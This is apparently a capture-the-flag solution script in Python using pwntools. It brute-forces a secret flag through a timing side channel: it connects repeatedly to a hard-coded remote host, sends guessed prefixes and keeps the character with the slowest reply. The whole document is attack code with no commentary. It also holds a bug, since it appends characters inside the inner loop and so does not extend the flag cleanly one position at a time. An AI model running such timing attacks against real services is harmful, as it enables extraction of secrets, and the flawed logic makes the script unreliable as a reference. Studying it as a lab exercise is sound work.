#!/usr/bin/python3
from pwn import *
import time, string
flag = ""
while True:
	max_time = 0
	max_char = ""
	for t in range(3):
		for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_0123456789":
			p = remote("132.68.36.59", 4015, level="error")
			p.recv() 
			print("cat "+flag+c)
			p.sendline(("cat "+flag+c).encode()) 
			time = float(p.recv().decode().split(" ")[2][:-2]) 
			print(time)
			p.close()
			if time > max_time and t > 1:
				max_time = time
				max_char = c
				flag += max_char
	print(flag)
